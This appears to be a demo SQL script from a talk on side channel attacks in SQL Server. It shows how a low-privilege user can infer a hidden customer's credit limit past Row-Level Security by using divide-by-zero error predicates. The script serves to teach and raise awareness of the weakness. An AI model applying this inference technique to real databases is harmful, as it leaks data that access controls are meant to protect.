/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.RLS.02.SideChannel.Values.sql
*	Notes:		Shows how values can be found beyond
*				the key using RLS side channel attacks.
*
*				Same basic attack, but with a known key
*				The key is not available to the user normally.
********************************************************************/
USE WWISideChannel
GO

--Show access as dbo
SELECT 
	USER_NAME()			UserName
	,SUSER_NAME()		SUserName
	,*
FROM sales.Customers

--User with minimal access, not DBO
EXECUTE AS USER = 'SideChannelUser'

--This customer is not available to SideChannelUser
SELECT *
FROM sales.Customers
WHERE CustomerID = 801


--Shows a value that does not trigger the error
--meaning it is not correct
SELECT *
FROM Sales.Customers
WHERE CustomerID = 801
	AND 1/(CreditLimit - 2999) = 0
GO


--CustomerID 801 has a type of "Corporate", so "Far West" would not pull these records.
SELECT *
FROM Sales.Customers
WHERE CustomerID = 801
	AND 1/(CreditLimit - 3000) = 0
GO

REVERT
GO
